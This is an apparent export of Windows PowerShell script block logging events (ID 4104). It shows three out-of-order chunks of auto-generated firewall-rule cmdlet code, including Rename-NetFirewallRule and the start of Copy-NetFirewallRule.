          if ($PSBoundParameters.ContainsKey('NewPolicyStore')) {
            [object]$__cmdletization_value = ${NewPolicyStore}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewPolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewPolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewGPOSession')) {
            [object]$__cmdletization_value = ${NewGPOSession}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewGPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewGPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodPa

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (14 of 19):
Cmdletization.GeneratedTypes.NetSecurity.EdgeTraversal[]]
    ${EdgeTraversalPolicy},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('LSM')]
    [ValidateNotNull()]
    [bool[]]
    ${LooseSourceMapping},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${LocalOnlyMapping},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Owner},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyAppId},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PackageFamilyName},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetApplicationFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallApplicationFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceTypeFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProtocolPortFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallPortFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetNetworkLayerSecurityFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallSecurityFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetServiceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallServiceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewPolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewGPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Be

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (13 of 19):
ation_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Direction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Direction})
        $__cmdletization_queryBuilder.FilterByProperty('Direction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Action') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Action})
        $__cmdletization_queryBuilder.FilterByProperty('Action', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EdgeTraversalPolicy') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EdgeTraversalPolicy})
        $__cmdletization_queryBuilder.FilterByProperty('EdgeTraversalPolicy', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('LooseSourceMapping') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${LooseSourceMapping})
        $__cmdletization_queryBuilder.FilterByProperty('LooseSourceMapping', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('LocalOnlyMapping') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${LocalOnlyMapping})
        $__cmdletization_queryBuilder.FilterByProperty('LocalOnlyMapping', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Owner') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Owner})
        $__cmdletization_queryBuilder.FilterByProperty('Owner', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyAppId') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyAppId})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyAppId', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PackageFamilyName') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PackageFamilyName})
        $__cmdletization_queryBuilder.FilterByProperty('PackageFamilyName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetFirewallRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallApplicationFilter') -and (@('ByAssociatedNetFirewallApplicationFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallApplicationFilter}, 'MSFT_NetFirewallRuleFilterByApplication', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceFilter') -and (@('ByAssociatedNetFirewallInterfaceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceFilter}, 'MSFT_NetFirewallRuleFilterByInterface', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceTypeFilter') -and (@('ByAssociatedNetFirewallInterfaceTypeFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceTypeFilter}, 'MSFT_NetFirewallRuleFilterByInterfaceType', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallPortFilter') -and (@('ByAssociatedNetFirewallPortFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallPortFilter}, 'MSFT_NetFirewallRuleFilterByProtocolPort', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallSecurityFilter') -and (@('ByAssociatedNetFirewallSecurityFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallSecurityFilter}, 'MSFT_NetFirewallRuleFilterBySecurity', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallServiceFilter') -and (@('ByAssociatedNetFirewallServiceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallServiceFilter}, 'MSFT_NetFirewallRuleFilterByService', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetFirewallRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Rename', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Rename-NetFirewallRule' -Alias '*'
        

function Copy-NetFirewallRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction[]]
    ${Direction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${Action},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (12 of 19):
ng[]]
    ${Owner},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyAppId},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PackageFamilyName},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetApplicationFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallApplicationFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceTypeFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProtocolPortFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallPortFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetNetworkLayerSecurityFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallSecurityFilter},

